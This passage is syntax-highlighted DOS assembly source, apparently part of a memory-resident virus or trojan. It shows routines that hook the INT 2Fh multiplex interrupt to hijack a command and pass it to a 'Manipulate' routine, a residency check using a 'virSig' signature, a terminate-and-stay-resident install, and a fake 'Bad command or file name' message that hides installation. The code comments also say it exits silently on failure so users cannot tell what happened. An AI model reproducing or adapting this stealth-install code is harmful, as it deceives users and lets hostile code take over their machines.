        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">SI</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DI</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc8">BX</span><span class="sc0">
        </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">UpperCaseSt</span><span class="sc0">
        </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">OurCmd</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc5">OurCommandLen</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">CLD</span><span class="sc0">
        </span><span class="sc6">REPE</span><span class="sc0">    </span><span class="sc6">CMPSB</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">

</span><span class="sc5">IsMatch2</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CX</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">SI</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DI</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc5">OurCommandLen</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">@@NotOurs</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc4">,</span><span class="sc8">DI</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">OurCmd</span><span class="sc0">
        </span><span class="sc6">CLD</span><span class="sc0">
        </span><span class="sc6">REPE</span><span class="sc0">    </span><span class="sc6">CMPSB</span><span class="sc0">
</span><span class="sc5">@@NotOurs</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">

</span><span class="sc5">Int2FHandler</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">010Fh</span><span class="sc0">      </span><span class="sc1">; Am I installed?</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">CheckCmd</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">virSig</span><span class="sc0">
        </span><span class="sc6">IRET</span><span class="sc0">
</span><span class="sc5">CheckCmd</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">0AEh</span><span class="sc0">        </span><span class="sc1">; a nifty-c00l majick function</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0">     </span><span class="sc5">@@ChainInt2F</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">      </span><span class="sc5">@@CheckCommand</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">      </span><span class="sc5">@@ExecuteCommand</span><span class="sc0">
</span><span class="sc5">@@ChainInt2F</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">OldInt2F</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">@@CheckCommand</span><span class="sc4">:</span><span class="sc0">                  </span><span class="sc1">; Dos is checking if we are a valid command</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc2">0FFFFh</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0">     </span><span class="sc5">@@ChainInt2F</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">IsMatch</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">@@ChainInt2F</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">0FFh</span><span class="sc0">
        </span><span class="sc6">IRET</span><span class="sc0">

</span><span class="sc5">@@ExecuteCommand</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc1">; Dos says "yup! - Execute it!"</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc2">0FFFFh</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0">     </span><span class="sc5">@@ChainInt2F</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">IsMatch2</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">@@ChainInt2F</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Manipulate</span><span class="sc0">
        </span><span class="sc6">IRET</span><span class="sc0">

</span><span class="sc5">Initialize</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc5">FuckCount</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">  </span><span class="sc1">; Clear it since we may have written junk</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">InstallMsg</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">09h</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">30h</span><span class="sc0">               </span><span class="sc1">; Check DOS version &gt;= 3.3</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc8">AL</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">0303h</span><span class="sc0">
        </span><span class="sc6">JB</span><span class="sc0">      </span><span class="sc5">@@InstallBad</span><span class="sc0">

        </span><span class="sc1">; NOTE: This checks to see if we are already installed in memory.</span><span class="sc0">
        </span><span class="sc1">;       Basically, we have added a new subfunction to the PRINT funcs</span><span class="sc0">
        </span><span class="sc1">;       which returns my initials if installed.</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">010Fh</span><span class="sc0">            </span><span class="sc1">; Check if we are installed</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">2Fh</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">virSig</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">@@InstallBad</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">352Fh</span><span class="sc0">              </span><span class="sc1">; Lets get and save int 2F</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc5">OldInt2F.Ofst</span><span class="sc4">,</span><span class="sc8">BX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc5">OldInt2F.Segm</span><span class="sc4">,</span><span class="sc8">ES</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">Int2FHandler</span><span class="sc0">  </span><span class="sc1">; And set it to ours</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">252Fh</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc2">2Ch</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,[</span><span class="sc8">SI</span><span class="sc4">]</span><span class="sc0">                  </span><span class="sc1">; get segment of env's memory</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">49h</span><span class="sc0">                   </span><span class="sc1">; release environment block's memory</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

        </span><span class="sc1">; NOTE: Normally, we would have something like OFFSET INITIALIZE but</span><span class="sc0">
        </span><span class="sc1">;       since we want to write the code from memory to disk, we have to</span><span class="sc0">
        </span><span class="sc1">;       keep the whole thing in memory.</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">EndOBug</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc2">15</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">SHR</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">CL</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">3100h</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">        </span><span class="sc1">; Terminate and stay resident!</span><span class="sc0">

</span><span class="sc5">@@InstallBad</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">4C00h</span><span class="sc0">  </span><span class="sc1">; Just quit with no message - no sense telling what</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">       </span><span class="sc1">; may have occured...</span><span class="sc0">

</span><span class="sc5">InstallMsg</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'Bad command or file name'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Ah</span><span class="sc0">
</span><span class="sc5">EndOBug</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'$'</span><span class="sc0">  </span><span class="sc1">; Very important (tho lame) - Do not remove!</span><span class="sc0">

</span><span class="sc5">_TEXT</span><span class="sc0">           </span><span class="sc9">ENDS</span><span class="sc0">
                </span><span class="sc9">END</span><span class="sc0">     </span><span class="sc5">Start</span><span class="sc0">
</span></div></body>
</html>
